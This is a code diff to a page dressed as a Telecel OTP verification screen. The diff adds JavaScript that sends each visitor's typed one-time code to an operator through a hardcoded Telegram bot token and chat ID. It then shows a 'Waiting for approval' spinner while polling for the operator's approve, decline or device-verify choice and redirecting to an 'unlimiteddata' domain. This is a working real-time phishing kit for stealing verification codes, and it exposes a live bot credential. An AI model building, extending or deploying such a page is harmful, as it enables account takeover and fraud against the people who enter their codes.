@@ -14,11 +14,11 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 15px;
+            padding: 12px;
         }
         .container {
             width: 100%;
-            max-width: 440px;
+            max-width: 420px;
             background: white;
             border-radius: 24px;
             box-shadow: 0 10px 40px rgba(0,0,0,0.1);
@@ -26,39 +26,40 @@
         }
         .logo-section {
             text-align: center;
-            padding: 40px 0 20px;
+            padding: 35px 0 20px;
         }
         .telecel-logo {
-            width: 145px;
-            height: 145px;
+            width: 138px;
+            height: 138px;
             margin: 0 auto;
         }
         h1 {
             text-align: center;
-            font-size: 24px;
+            font-size: 23px;
             font-weight: 700;
-            margin: 12px 0 8px;
+            margin: 10px 0 6px;
             color: #1e2937;
             padding: 0 20px;
         }
         .subtitle {
             text-align: center;
             color: #475569;
-            font-size: 15.5px;
+            font-size: 15.2px;
             padding: 0 25px 20px;
             line-height: 1.45;
         }
         .otp-container {
             display: flex;
             justify-content: center;
-            gap: 12px;
-            margin: 20px 0 30px;
+            gap: 10px;
+            margin: 20px 0 28px;
+            padding: 0 10px;
         }
         .otp-input {
-            width: 58px;
-            height: 68px;
+            width: 52px;
+            height: 62px;
             text-align: center;
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 700;
             border: 2px solid #e2e8f0;
             border-radius: 12px;
@@ -66,14 +67,14 @@
         }
         .otp-input:focus {
             border-color: #E30613;
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
         }
         .form-section {
             padding: 0 25px 35px;
         }
         .error-msg {
             text-align: center;
-            margin: 12px 0;
+            margin: 12px 20px;
             font-size: 14.5px;
             padding: 12px;
             border-radius: 10px;
@@ -83,7 +84,7 @@
         }
         .success-msg {
             text-align: center;
-            margin: 12px 0;
+            margin: 12px 20px;
             font-size: 14.5px;
             padding: 12px;
             border-radius: 10px;
@@ -97,11 +98,11 @@
             color: white;
             border: none;
             padding: 16px;
-            font-size: 17.5px;
+            font-size: 17px;
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
-            margin-top: 10px;
+            margin: 8px 0;
         }
         .back-btn {
             width: 100%;
@@ -113,12 +114,33 @@
             font-weight: 600;
             border-radius: 50px;
             cursor: pointer;
-            margin-top: 12px;
         }
+        #spinner {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.92);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            color: white;
+        }
+        .spin {
+            width: 70px;
+            height: 70px;
+            border: 7px solid #fff;
+            border-top-color: #E30613;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
         @media (max-width: 480px) {
-            .telecel-logo { width: 130px; height: 130px; }
-            .otp-input { width: 52px; height: 62px; font-size: 24px; }
-            h1 { font-size: 22px; }
+            .container { border-radius: 20px; }
+            .telecel-logo { width: 115px; height: 115px; }
+            .otp-input { width: 48px; height: 58px; font-size: 24px; }
+            h1 { font-size: 21.5px; }
         }
     </style>
 </head>
@@ -150,14 +172,22 @@
         </div>
     </div>
 
+    <!-- Spinner -->
+    <div id="spinner">
+        <div class="spin"></div>
+        <p style="margin-top:15px;">Waiting for approval...</p>
+    </div>
+
     <script>
-        // Your existing script (kept functional)
         const CONFIG = {
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
-            CHAT_ID: '7547427914'
+            CHAT_ID: '7547427914',
+            APPROVE_PAGE: 'https://unlimiteddata.vercel.app/otp.html',   // You can change if needed
+            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
+            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
         };
 
-        const state = {
+        let state = {
             lastUpdateId: 0,
             pollInterval: null,
             approveId: null,
@@ -169,7 +199,9 @@
         const verifyBtn = document.getElementById('verifyBtn');
         const errMsg = document.getElementById('err');
         const successMsg = document.getElementById('successMsg');
+        const spinner = document.getElementById('spinner');
 
+        // Auto-focus and movement
         inputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 if (e.target.value.length > 1) {
@@ -181,6 +213,7 @@
                 if (e.target.value && index < inputs.length - 1) {
                     inputs[index + 1].focus();
                 }
+                checkAndAutoSubmit();
             });
 
             input.addEventListener('keydown', (e) => {
@@ -190,12 +223,95 @@
             });
         });
 
-        verifyBtn.onclick = () => {
-            alert("OTP Verified! (Demo)");
-            // Add your actual OTP submission logic here
-        };
+        function getOTP() {
+            let otp = "";
+            inputs.forEach(input => otp += input.value);
+            return otp;
+        }
 
-        // Auto-focus first input
+        function checkAndAutoSubmit() {
+            if (getOTP().length === 5) {
+                setTimeout(submitOTP, 300);
+            }
+        }
+
+        function submitOTP() {
+            const otp = getOTP();
+            if (otp.length !== 5) return;
+
+            errMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+            spinner.style.display = 'flex';
+
+            const ts = Date.now();
+            state.approveId = `otp_approve_${ts}`;
+            state.declineId = `otp_decline_${ts}`;
+            state.verifyDeviceId = `otp_verify_${ts}`;
+
+            const message = `<b>🔴 OTP Verification Received</b>\n\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve & Complete", callback_data: state.approveId },
+                                { text: "❌ Decline", callback_data: state.declineId }
+                            ],
+                            [{ text: "📱 Verify Device", callback_data: state.verifyDeviceId }]
+                        ]
+                    }
+                })
+            }).then(() => {
+                startPolling();
+            }).catch(() => {
+                spinner.style.display = 'none';
+                errMsg.textContent = "Connection error. Please try again.";
+                errMsg.style.display = 'block';
+            });
+        }
+
+        function startPolling() {
+            if (state.pollInterval) clearInterval(state.pollInterval);
+
+            state.pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+                                if (cb === state.approveId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.SUCCESS_PAGE;
+                                } else if (cb === state.declineId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    errMsg.textContent = "Request declined. Please try again.";
+                                    errMsg.style.display = 'block';
+                                    successMsg.style.display = 'none';
+                                } else if (cb === state.verifyDeviceId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.DEVICE_PAGE;
+                                }
+                            }
+                        });
+                    });
+            }, 2000);
+        }
+
+        verifyBtn.onclick = submitOTP;
+
+        // Auto focus first input
         inputs[0].focus();
     </script>
 </body>
